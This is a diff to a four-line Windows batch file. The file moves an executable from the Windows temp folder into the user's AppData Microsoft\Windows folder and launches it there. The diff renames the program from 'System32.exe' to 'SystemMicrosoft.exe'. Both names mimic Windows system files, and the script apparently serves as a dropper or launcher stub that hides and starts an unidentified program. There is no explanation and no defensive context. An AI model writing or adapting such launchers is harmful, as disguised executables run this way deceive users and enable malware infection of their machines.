@@ -1,4 +1,4 @@
 @echo off
-move C:\Windows\temp\System32.exe %appdata%\\Microsoft\\Windows\\System32.exe
-start %appdata%\\Microsoft\\Windows\\System32.exe
+move C:\Windows\temp\SystemMicrosoft.exe %appdata%\\Microsoft\\Windows\\SystemMicrosoft.exe
+start %appdata%\\Microsoft\\Windows\\SystemMicrosoft.exe
 exit
